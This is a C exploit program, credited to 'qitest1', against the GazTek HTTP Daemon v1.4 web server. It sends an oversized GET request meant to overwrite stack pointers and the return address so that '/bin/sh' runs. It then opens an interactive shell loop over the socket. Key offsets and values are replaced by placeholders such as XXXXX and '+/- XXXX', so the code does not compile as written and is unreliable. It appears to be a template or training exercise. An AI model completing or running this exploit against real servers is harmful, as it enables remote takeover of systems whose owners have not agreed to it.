
#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <netinet/in.h>
#include <netdb.h>

char    mybuf[XXXXX];
int     sockami(char *host, int port);
void	do_mybuf();
void	shellami(int sock);
void	usage(char *progname);

int main(int argc, char **argv)
{
    int     sel = 0,
            offset = 0,
            sock,
            cnt;
    char    *host = NULL,
            sbuf[sizeof(mybuf) + 100];

    printf("\n  GazTek HTTP Daemon v1.4 (ghttpd) exploit by qitest1\n\n");

    if(argc == 1)
    {
        usage(argv[0]);
        return -1;
    }

    while((cnt = getopt(argc,argv,"h:t:o:")) != EOF)
    {
        switch(cnt)
        {
            case 'h':
                host = strdup(optarg);
                break;
            case 't':
                sel = atoi(optarg);       
                break;
            case 'o':
                offset = atoi(optarg);
                break;
            default:
                usage(argv[0]);
                break;
        }
    }
    if(host == NULL)
    {
        usage(argv[0]);
        return -1;
    }

    printf("+Host: %s\n", host);
    sock = sockami(host, 80);

    do_mybuf();

    sprintf(sbuf, "GET /%s", mybuf);
    send(sock, sbuf, strlen(sbuf), 0);



    sleep(2);
    shellami(sock);  
}


int sockami(char *host, int port)
{
    struct sockaddr_in address;
    struct hostent *hp;
    int sock;

    sock = socket(AF_INET, SOCK_STREAM, 0);
    if(sock == -1)
    {
        perror("socket()");
        return (-1);
    }

    hp = gethostbyname(host);
    if(hp == NULL)
    {
        perror("gethostbyname()");
        return (-1);
    }

    memset(&address, 0, sizeof(address));
    memcpy((char *) &address.sin_addr, hp->h_addr, hp->h_length);
    address.sin_family = AF_INET;
    address.sin_port = htons(port);

    if(connect(sock, (struct sockaddr *) &address, sizeof(address)) == -1)
    {
        perror("connect()");
        return (-1);
    }

    return(sock);
}



void do_mybuf()
{
    int		i, n = 0;
    char    new_path[] = "/bin/sh";
    unsigned char   *p_new_path = NULL;
    signed long   *ebp;

    memset(mybuf, 0x41, sizeof(mybuf));

    ebp = (unsigned long *)(mybuf + XXXXX);
    *(ebp +/- XXXX)  = XXXXX;       // new host
    *(ebp +/- XXXX)  = XXXXX;       // new ptr
    *ebp = XXXXX; 
    *(ebp +/- XXXX)  = XXXXX;       // new ret (should fill in the same value as old ret)
    // [ebp - 0x2c] is the ptr value?
    // [ebp - 0x28] is the thehost value? 
    // make sure [thehost + 0x2fd] is 0
    // make sure [thehost + 0x3fc] is 0

    // the new path string
    p_new_path = (unsigned char *)(ebp +/- XXXXX);

    for(i = 0; i < strlen(new_path); p_new_path++)
        *p_new_path = new_path[i++];

    *(p_new_path++) = '\n';
    *(p_new_path++) = '\n';
    *(p_new_path++) = 0x01;             // padding
    *(p_new_path++) = 0x01;             // padding
    *(p_new_path++) = 0x01;             // padding
    *(p_new_path++) = 0x04;             // sockfd 
    *(p_new_path++) = 0x00;
    //or maybe something else that works
}

void shellami(int sock)
{
    int             n;
    char            recvbuf[1024];
    char            *cmd = "id; uname -a\n";
    fd_set          rset;

    send(sock, cmd, strlen(cmd), 0);

    while (1)
    {
        FD_ZERO(&rset);
        FD_SET(sock,&rset);
        FD_SET(STDIN_FILENO,&rset);
        select(sock+1,&rset,NULL,NULL,NULL);
        if (FD_ISSET(sock,&rset))
        {
            n=read(sock,recvbuf,1024);
            if (n <= 0)
            {
                printf("Connection closed by foreign host.\n");
                return;
            }
            recvbuf[n]=0;
            printf("%s",recvbuf);
        }
        if (FD_ISSET(STDIN_FILENO,&rset))
        {
            n=read(STDIN_FILENO,recvbuf,1024);
            if (n>0)
            {
                recvbuf[n]=0;
                write(sock,recvbuf,n);
            }
        }
    }
    return;
}

void usage(char *progname)
{
    int             i = 0;

    printf("Usage: %s [options]\n", progname);
    printf("Options:\n"
            "  -h hostname\n"
            "Available targets:\n");

    return;
}

